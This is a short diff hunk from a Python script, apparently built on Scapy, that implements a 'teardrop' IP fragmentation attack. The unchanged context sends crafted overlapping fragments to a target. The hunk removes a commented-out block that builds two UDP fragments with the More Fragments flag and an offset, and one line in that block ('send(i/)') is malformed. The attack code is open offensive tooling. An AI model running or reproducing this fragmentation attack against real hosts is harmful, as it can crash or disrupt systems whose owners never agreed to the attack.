@@ -52,23 +52,6 @@ class teardrop:
 			send(i/load)
 			send(j/load)
 			send(k/load)
-			'''size=4000
-			offset=120
-			data="X"*size
-			  
-			i=IP()
-			i.dst=target
-			i.flags="MF"
-			i.proto=17
-			  
-			j=IP()
-			j.dst=target
-			j.flags=0
-			j.proto=17
-			j.frag=offset
-			  
-			send(i/)
-			send(j/data)'''
 	except KeyboardInterrupt:
 		sys.exit(1)
 	except:
